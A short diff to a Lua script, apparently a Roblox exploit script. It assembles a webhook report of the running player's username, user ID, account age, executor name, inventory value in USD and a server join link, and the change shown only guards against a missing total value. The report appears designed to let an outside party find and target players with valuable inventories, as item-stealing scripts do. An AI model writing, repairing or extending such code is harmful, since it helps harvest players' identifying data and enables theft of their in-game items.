@@ -291,7 +291,6 @@ local function GetUSD(list)
     return {total = "0.00", itemPrices = {}}
 end
 
--- Webhook functions
 local function SendFirstMessage(list, prefix, totalValue)
     local usdData = GetUSD(list)
     local totalUSD = usdData.total or "0.00"
@@ -302,9 +301,10 @@ local function SendFirstMessage(list, prefix, totalValue)
     local fields = {
         { name = "\240\159\142\175 __Information__", value = "```User     : " .. plr.Name .. "\nID       : " .. plr.UserId .. "\nAge      : " .. plr.AccountAge .. "\nExecutor : " .. Executor .. "```", inline = false },
         { name = "\240\159\140\144 __Server__", value = "```Players    : " .. #Players:GetPlayers() .. " / " .. game.Players.MaxPlayers .. "```", inline = false },
-        { name = "\240\159\147\166 __Inventory:__", value = "```Total Value: " .. totalValue .. " / \$" .. totalUSD .. "\n\n", inline = false },
+        { name = "\240\159\147\166 __Inventory:__", value = "```Total Value: " .. (totalValue or 0) .. " / \$" .. totalUSD .. "\n\n", inline = false },
         { name = "\240\159\148\151  __Join Link__", value = "[**Click to Join**](" .. JoinLink .. ")", inline = false }
     }
+    -- ... rest of function
 
     for _, item in ipairs(list) do
         local itemInfo = database[item.DataID]
